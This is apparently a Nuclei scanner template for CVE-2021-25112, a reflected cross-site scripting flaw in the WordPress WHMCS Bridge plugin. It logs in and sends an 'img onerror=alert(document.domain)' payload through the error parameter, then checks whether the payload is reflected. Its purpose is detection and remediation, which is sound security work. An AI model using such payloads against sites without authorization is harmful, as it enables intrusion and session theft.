id: CVE-2021-25112

info:
  name: WordPress WHMCS Bridge <6.4b - Cross-Site Scripting
  author: dhiyaneshDk
  severity: medium
  description: |
    WordPress WHMCS Bridge plugin before 6.4b contains a reflected cross-site scripting vulnerability. It does not sanitize and escape the error parameter before outputting it back in the admin dashboard.
  impact: |
    Successful exploitation of this vulnerability could allow an attacker to execute arbitrary JavaScript code in the context of the victim's browser, leading to potential data theft, session hijacking, or defacement of the affected website.
  remediation: |
    Update WordPress WHMCS Bridge to version 6.4b or later to mitigate this vulnerability.
  reference:
    - https://wpscan.com/vulnerability/4aae2dd9-8d51-4633-91bc-ddb53ca3471c
    - https://plugins.trac.wordpress.org/changeset/2659751
    - https://nvd.nist.gov/vuln/detail/CVE-2021-25112
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2021-25112
    cwe-id: CWE-79
    epss-score: 0.001
    epss-percentile: 0.40832
    cpe: cpe:2.3:a:i-plugins:whmcs_bridge:*:*:*:*:*:wordpress:*:*
  metadata:
    max-request: 2
    vendor: i-plugins
    product: whmcs_bridge
    framework: wordpress
  tags: cve2021,cve,whmcs,xss,wpscan,wordpress,wp-plugin,wp,authenticated,i-plugins

http:
  - raw:
      - |
        POST /wp-login.php HTTP/1.1
        Host: {{Hostname}}
        Origin: {{RootURL}}
        Content-Type: application/x-www-form-urlencoded
        Cookie: wordpress_test_cookie=WP%20Cookie%20check

        log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1
      - |
        GET /wp-admin/options-general.php?page=cc-ce-bridge-cp&error=%3Cimg%20src%20onerror=alert(document.domain)%3E HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "<strong><img src onerror=alert(document.domain)></strong>"

      - type: word
        part: header
        words:
          - text/html

      - type: status
        status:
          - 200
# digest: 4b0a00483046022100a19eeb0552168ee1356c337047ab29e07fb9a79b3127aae8251113ba43294167022100ed3d86d56358e3a75345047f5dbafe388d49d0c21c9952b07c2d1ae97cbd29e8:922c64590222798bb761d5b6d8e72950